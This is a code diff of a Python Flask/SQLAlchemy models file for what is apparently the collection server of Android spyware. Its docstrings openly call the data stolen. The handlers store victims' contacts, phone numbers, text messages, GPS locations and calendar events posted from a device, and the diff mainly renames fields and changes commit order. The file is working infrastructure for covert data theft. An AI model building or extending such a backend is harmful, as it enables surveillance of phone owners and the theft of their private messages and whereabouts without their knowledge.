@@ -10,13 +10,13 @@ class Contact(db.Model):
     contact_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
     user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
 
-    displayNamePrimary = db.Column(db.String(64), nullable=False)
-    homeAddress = db.Column(db.String(64), nullable=True)
+    display_name_primary = db.Column(db.String(64), nullable=False)
+    home_adress = db.Column(db.String(64), nullable=True)
     email = db.Column(db.String(64), nullable=True)
     organisation = db.Column(db.String(64), nullable=True)
     birthday = db.Column(db.String(64), nullable=True)
-    phoneNumbers = db.relationship("PhoneNumber")
-    textMessages = db.relationship("TextMessage")
+    phone_numbers = db.relationship("PhoneNumber")
+    text_messages = db.relationship("TextMessage")
 
     @staticmethod
     def userdata_post_handler(user_id, contact_data_dict):
@@ -24,31 +24,28 @@ class Contact(db.Model):
         # Create contact
         contact = Contact(
             user_id=int(user_id),
-            displayNamePrimary=contact_data_dict.get("displayNamePrimary"),
-            homeAddress=contact_data_dict.get("homeAddress"),
+            display_name_primary=contact_data_dict.get("displayNamePrimary"),
+            home_adress=contact_data_dict.get("homeAddress"),
             email=contact_data_dict.get("email"),
             organisation=contact_data_dict.get("organisation"),
             birthday=contact_data_dict.get("birthday")
         )
+        db.session.add(contact)
+        # we need to commit here to generate the contact_id
+        db.session.commit()
+
         # Create related text messages
         for message in contact_data_dict.get("textMessages", []):
-            try:
-                time_stamp = date.fromtimestamp(int(message.get("timeStamp")))
-
-                text_message = TextMessage(
-                    user_id=contact.user_id,
-                    contact_id=contact.contact_id,
-                    android_given_id=message.get("id"),
-                    # TODO: Might need long to date conversion
-                    time_stamp=time_stamp,
-                    body=message.get("body"),
-                    address=message.get("address"),
-                    inbound=message.get("inbound")
-                )
-                db.session.add(text_message)
-            except ValueError:
-                # TODO: Silent error, caller of data handler wont know that this failed 
-                pass
+            text_message = TextMessage(
+                user_id=contact.user_id,
+                contact_id=contact.contact_id,
+                android_given_id=message.get("id"),
+                time_in_UTC_milliseconds=message.get("timeInUTCMilliseconds"),
+                body=message.get("body"),
+                address=message.get("address"),
+                inbound=message.get("inbound")
+            )
+            db.session.add(text_message)
 
         # Create related phone numbers
         for number in contact_data_dict.get("phoneNumbers", []):
@@ -58,11 +55,10 @@ class Contact(db.Model):
             )
             db.session.add(phone_number)
 
-        db.session.add(contact)
         db.session.commit()
 
     def __repr__(self):
-        return "<Contact {}.{} {}>".format(self.contact_id, self.firstname, self.lastname)
+        return "<Contact {}.{}>".format(self.contact_id, self.display_name_primary)
 
 class TextMessage(db.Model):
     """Models a stolen textMessage from a user send by a ceratin contact
@@ -75,13 +71,13 @@ class TextMessage(db.Model):
 
     # TODO: I dont know whether BigInteger is the same as long
     android_given_id = db.Column(db.BigInteger, nullable=False)
-    time_stamp = db.Column(db.Date, nullable=False)
+    time_in_UTC_milliseconds = db.Column(db.BigInteger, nullable=False)
     body = db.Column(db.String(64), nullable=False)
     address = db.Column(db.String(64), nullable=False)
     inbound = db.Column(db.Boolean, default=False)
 
     def __repr__(self):
-        return "<Textmessage {}.{}: {}>".format(self.textmessage_id, self.time_stamp, self.body)
+        return "<Textmessage {}: {}>".format(self.textmessage_id, self.body)
 
 class PhoneNumber(db.Model):
     """Models a phonenumbers associated with a stolen contact
@@ -91,7 +87,7 @@ class PhoneNumber(db.Model):
     phonenumber_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
     contact_id = db.Column(db.Integer, db.ForeignKey("contact.contact_id"))
 
-    number = db.Column(db.String(64), nullable=False)
+    number = db.Column(db.String(16), nullable=False)
 
     def __repr__(self):
         return "<PhoneNumber {}.{} {}>".format(self.phonenumber_id, self.contact_id, self.number)
@@ -104,7 +100,7 @@ class Location(db.Model):
 
     longitude = db.Column(db.Float, nullable=False)
     latitude = db.Column(db.Float, nullable=False)
-    time_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
+    time_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
 
     @staticmethod
     def userdata_post_handler(user_id, location_data_dict):
@@ -113,13 +109,13 @@ class Location(db.Model):
             user_id=int(user_id),
             longitude=location_data_dict.get("longitude"),
             latitude=location_data_dict.get("latitude"),
-            time_utc_milliseconds=location_data_dict.get("timeInUTCMilliseconds"),
+            time_in_utc_milliseconds=location_data_dict.get("timeInUTCMilliseconds"),
         )
         db.session.add(location)
         db.session.commit()
 
     def __repr__(self):
-        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_utc_milliseconds, self.latitude, self.longitude)
+        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_in_utc_milliseconds, self.latitude, self.longitude)
 
 class CalendarEvent(db.Model):
     """Models a calendar entry stolen from a user"""
@@ -129,8 +125,8 @@ class CalendarEvent(db.Model):
 
     title = db.Column(db.String(64), nullable=False)
     event_location = db.Column(db.String(64), nullable=True)
-    start_utc_milliseconds = db.Column(db.BigInteger, nullable=True)
-    end_utc_milliseconds = db.Column(db.BigInteger, nullable=True)
+    start_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
+    end_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
 
     @staticmethod
     def userdata_post_handler(user_id, calendar_data_dict):
@@ -140,8 +136,8 @@ class CalendarEvent(db.Model):
             user_id=int(user_id),
             title=calendar_data_dict.get("title"),
             event_location=calendar_data_dict.get("eventLocation"),
-            start_utc_milliseconds=calendar_data_dict.get("startInUTCMilliseconds"),
-            end_utc_milliseconds=calendar_data_dict.get("endInUTCMilliseconds"),
+            start_in_utc_milliseconds=calendar_data_dict.get("startInUTCMilliseconds"),
+            end_in_utc_milliseconds=calendar_data_dict.get("endInUTCMilliseconds"),
         )
         db.session.add(event)
         db.session.commit()
